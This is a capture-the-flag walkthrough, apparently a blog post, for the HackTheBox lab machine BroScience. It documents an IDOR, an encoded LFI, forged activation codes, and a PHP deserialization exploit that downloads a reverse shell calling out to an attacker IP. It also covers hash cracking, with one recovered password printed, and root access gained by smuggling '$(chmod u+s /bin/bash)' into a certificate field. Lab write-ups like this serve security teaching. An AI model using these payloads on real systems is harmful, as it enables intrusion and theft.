---
title: BroScience 
date: 2023-01-09 12:00:00
categories: [HTB,CTF]
tags: [htb]
---

# Enumeration

## Rustscan

```bash
mkdir rust; sudo rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.129.126.84 -- -sV -sC -oA ./rust/{{ip}}
```

### Ports

```bash
Open 10.129.126.84:22
Open 10.129.126.84:80
Open 10.129.126.84:443
```

### Services

```bash
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http    syn-ack ttl 63 Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Debian)
443/tcp open  ssl     syn-ack ttl 63
|_ip-https-discover: ERROR: Script execution failed (use -d to debug)
|_http-title: 400 Bad Request
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.54 (Debian)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
```

## Sitename

Using **curl** we are able to determine the servername and can add it to our **/etc/hosts** file which can help us for example in subdomain enumeration 

```bash
curl -Iv 10.129.126.84
```

```bash
*   Trying 10.129.126.84:80...
* Connected to 10.129.126.84 (10.129.126.84) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 10.129.126.84
> User-Agent: curl/7.85.0
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
HTTP/1.1 301 Moved Permanently
< Server: Apache/2.4.54 (Debian)
Server: Apache/2.4.54 (Debian)
< Location: https://broscience.htb/
Location: https://broscience.htb/
```

## Dirsearch

```bash
dirsearch -u https://broscience.htb/
```

```bash
[21:24:10] 200 -    2KB - /activate.php 
[21:24:10] 200 -    2KB - /images/                                          
[21:24:10] 301 -  319B  - /images  ->  https://broscience.htb/images/       
[21:24:10] 301 -  321B  - /includes  ->  https://broscience.htb/includes/   
[21:24:10] 200 -    2KB - /includes/                                        
[21:24:11] 200 -    9KB - /index.php                                        
[21:24:11] 200 -    9KB - /index.php/login/                                 
[21:24:12] 301 -  323B  - /javascript  ->  https://broscience.htb/javascript/
[21:24:14] 200 -    2KB - /login.php                                        
[21:24:15] 302 -    0B  - /logout.php  ->  /index.php                       
[21:24:16] 200 -  676B  - /manual/index.html                                
[21:24:16] 301 -  319B  - /manual  ->  https://broscience.htb/manual/
[21:24:27] 200 -    2KB - /register.php                                                                       
[21:24:33] 301 -  319B  - /styles  ->  https://broscience.htb/styles/       
[21:24:38] 200 -    1KB - /user.php 
```

## Website

The website itself can be described as a collection of training excercises that can be added and commented by registered users.  

### Registration

When we try to register a user it says that the activation code will be send to us by email.  

### IDOR

While browsing the page we were able to identify an IDOR that exposes  
- E-Mail Address
- IS Activated
- IS Admin

```url
# Just change the ID
https://broscience.htb/user.php?id=1
```

### LFI

While checking [https://broscience.htb/includes/](https://broscience.htb/includes/) we discover a php file named **img.php**.
Opening that page will tell us  

```bash
Error: Missing 'path' parameter.
```

Basic **LFI** will fail and tell us **Error: Attack detected.**  
We have to double URL Encode it so that it will work  

```url
# Failing
https://broscience.htb/includes/img.php?path=../../../../etc/passwd
```

#### /etc/passwd

```url
https://broscience.htb/includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

```bash
# We identified "bill" as user and it seems that postgresql is installed
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

#### /var/www/html/includes/db_connect.php
```url
https://broscience.htb/includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%36%34%25%36%32%25%35%66%25%36%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%32%65%25%37%30%25%36%38%25%37%30
```

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "CENSORED";
$db_pass = "CENSORED";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

#### /var/www/html/includes/utils.php

Seems to be the script that generates activation codes and is used to update a cookie called **user-prefs**. Since **user-prefs** uses serialization this could be an attack vector during our next steps. 

```url
https://broscience.htb/includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%37%35%25%37%34%25%36%39%25%36%63%25%37%33%25%32%65%25%37%30%25%36%38%25%37%30
```

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
...
```

#### /var/www/html/activate.php

Used to activate a freshly registered user account

```url
https://broscience.htb/%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%31%25%36%33%25%37%34%25%36%39%25%37%36%25%36%31%25%37%34%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30
```

```php
if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
        include_once 'includes/db_connect.php';

        $res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');
        $res = pg_execute($db_conn, "check_code_query", array($_GET['code']));

        if (pg_num_rows($res) == 1) {
            // Check if account already activated
            $row = pg_fetch_row($res);
            if (!(bool)$row[1]) {
                // Activate account
                $res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');
                $res = pg_execute($db_conn, "activate_account_query", array($row[0]));
                
                $alert = "Account activated!";
                $alert_type = "success";
            } else {
                $alert = 'Account already activated.';
            }
        } else {
            $alert = "Invalid activation code.";
        }
    } else {
        $alert = "Invalid activation code.";
    }
} else {
    $alert = "Missing activation code.";
}
```

# Exploitation

## User activation

We'll use the code snippet discovered in **includes/utils.php** to generate an activation code for our previously created user.  
The date has been taken from the burp request that was captured while registering on the page.  

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(strtotime("Mon, 09 Jan 2023 21:28:34 GMT"));
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code;
}

generate_activation_code();
?>
```

```bash
┌──(mrk㉿htb)-[~/Dokumente/htb/lab/broscience]
└─$ php generate.php
AtbiWw4c7YXN82lc9enxtWRg531vVkZe
```

Now it's time to activate the account  

```http
GET /activate.php?code=AtbiWw4c7YXN82lc9enxtWRg531vVkZe HTTP/1.1
Host: broscience.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

## Deserialization

After we logged in we can see that a new **Cookie** called **users-prefs** has been added. This cookie changes as soon as we switch the theme using **swap_theme.php**  

Following code has been taken from **includes/utils.php**

### Reference Code

**get_theme()**
```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```

**class Avatar**
```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

### Exploitation

We'll no change the **class Avatar** code up a little to generate serialized data that we will inject using the **user-prefs** cookie.  

#### serialized.php

```php
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.161/rev.php";
    public $imgPath = "./rev.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$serialized = base64_encode(serialize(new AvatarInterface));
echo $serialized
?>
```

```bash
┌──(mrk㉿oscp)-[~/Dokumente/htb/lab/broscience]
└─$ php serialized.php               
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNzoiaHR0cDovLzEwLjEwLjE0LjE2MS9yZXYucGhwIjtzOjc6ImltZ1BhdGgiO3M6OToiLi9yZXYucGhwIjt9
```

#### rev.php

```php
<?php
  system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.161/4444 0>&1'");
?>
```

#### Shell

```bash
# Change your user-prefs cookie to include the serialized data and reload the page after you started the webserver
# Host a simple webserver
┌──(mrk㉿oscp)-[~/Dokumente/htb/lab/broscience]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.126.84 - - [09/Jan/2023 23:05:31] "GET /rev.php HTTP/1.0" 200 -

# Now just open rev.php either in your browser or using the commandline
┌──(mrk㉿oscp)-[~/Dokumente/htb/lab/broscience]
└─$ curl -k https://broscience.htb/rev.php

# We got a shell
┌──(mrk㉿oscp)-[~]
└─$ pwncat-cs -lp 4444
[23:05:40] Welcome to pwncat 🐈!                                                                                                                                                                                             __main__.py:164
[23:05:41] received connection from 10.129.126.84:47600                                                                                                                                                                           bind.py:84
[23:06:02] 10.129.126.84:47600: registered new host w/ db
```

## Privilege Escalation - Bill

### Postgres 

We start with enumeration of the database of which we already discovered the credentials

```bash
psql -h localhost -d broscience -U dbuser -W

broscience-> \d
                List of relations
 Schema |       Name       |   Type   |  Owner   
--------+------------------+----------+----------
 public | comments         | table    | postgres
 public | comments_id_seq  | sequence | postgres
 public | exercises        | table    | postgres
 public | exercises_id_seq | sequence | postgres
 public | users            | table    | postgres
 public | users_id_seq     | sequence | postgres
 
 broscience=> SELECT * FROM users;
 administrator:15657792073e8a843d4f91fc403454e1
 bill:13edad4932da9dbb57d9cd15b66ed104
 michael:bd3dad50e2d578ecba87d5fa15ca5f85
 john:a7eed23a7be6fe0d765197b1027453fe
 dmytro:5d15340bded5b9395d5d14b9c21bc82b
```

### Cracking Hashes

Every password used NaCl as password salt so we have to edit our wordlist before we can crack the hashes  

```bash
sed -i 's|^|NaCl|g' rockyou.txt
```

Cracking md5 hashes  

```bash
hashcat -m 0 -a 0 -o cracked.txt hashes.txt ./rockyou.txt --username
13edad4932da9dbb57d9cd15b66ed104:CENSORED (bill)
5d15340bded5b9395d5d14b9c21bc82b:CENSORED (dmytro)
bd3dad50e2d578ecba87d5fa15ca5f85:CENSORED (michael)
```

Using the password **iluvhorsesandgym** we are able to become user **bill**

# Privilege Escalation

## Local Enumeration
First we upload **pspy64** for further enumeration

```bash
chmod +x /tmp/pspy64
/tmp/pspy64
```

Using pspy64 it's clear that the root user runs a script to check if a certificate needs to be renewed  

```bash
/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
```

## Abusing renew_cert.sh

**renew_cert.sh**
```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

Let's create a certificate that will expire soon so that root will create a new one.  
We will leave everything empty except the **commonName**, that's the place where we store our payload.  

```bash
bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 10
Generating a RSA private key
........................................................................++++
.............................++++
writing new private key to 'broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
Email Address []:
```

After waiting for a while **/bin/bash** will be modified and we can use the suid permissions to become root!

## ROOT

```bash
bill@broscience:~/Certs$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
bill@broscience:~/Certs$ /bin/bash -p
bash-5.1# whoami
root
```